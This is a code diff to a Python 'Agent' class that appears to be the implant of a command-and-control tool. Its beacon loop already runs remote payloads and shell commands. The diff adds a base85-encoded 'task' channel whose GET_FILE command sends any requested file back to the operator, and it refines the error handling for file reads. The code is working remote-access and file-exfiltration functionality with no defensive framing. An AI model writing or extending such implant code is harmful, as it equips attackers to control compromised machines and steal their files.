@@ -58,7 +58,8 @@ class Agent:
                 return True
             except:
                 logging.debug(
-                    "Connection to port " + str(port) + " was not successful."
+                    "Connection to port " + str(port) + " was not successful.",
+                    exc_info=True,
                 )
                 pass
         return False
@@ -184,7 +185,10 @@ class Agent:
         try:
             file = open(filename, "rb")
         except FileNotFoundError:
-            self.respond("File not found!", "AGENT_ERROR")
+            self.respond("FILE_NOT_FOUND_ERROR", "AGENT_ERROR")
+            return
+        except PermissionError:
+            self.respond("PERMISSION_ERROR", "AGENT_ERROR")
             return
         while True:
             chunk_data = file.read(_AGENT_OPTIONS["TRANSFER_BLOCK_SIZE"])
@@ -240,6 +244,15 @@ class Agent:
         if sp_stderr != b"":
             self.respond(sp_stderr, "STDERR")
 
+    def run_task(self, task):
+        logging.debug("Running a task")
+        task = json.loads(base64.b85decode(task).decode())
+
+        if task["cmd"] == "GET_FILE":
+            file = task["file"]
+            logging.debug("GET_FILE: " + file)
+            self.send_file(file)
+
     def write_pid_file(self):
         my_pid = str(os.getpid())
         pidfile = open(_AGENT_OPTIONS["PID_FILE"], "w")
@@ -283,7 +296,6 @@ class Agent:
                 if _AGENT_STATE_ENUM == 1:
                     if self.associate():
                         _AGENT_STATE_ENUM = 2
-                        # self.send_file("/tmp/in")
                 if _AGENT_STATE_ENUM == 2:
                     beacon_response = self.beacon()
                     if beacon_response is False:
@@ -295,6 +307,8 @@ class Agent:
                             self.run_payload(cmd["payload"])
                         if cmd["command"]:
                             self.run_command(cmd["command"])
+                        if cmd["task"]:
+                            self.run_task(cmd["task"])
 
 
 if __name__ == "__main__":
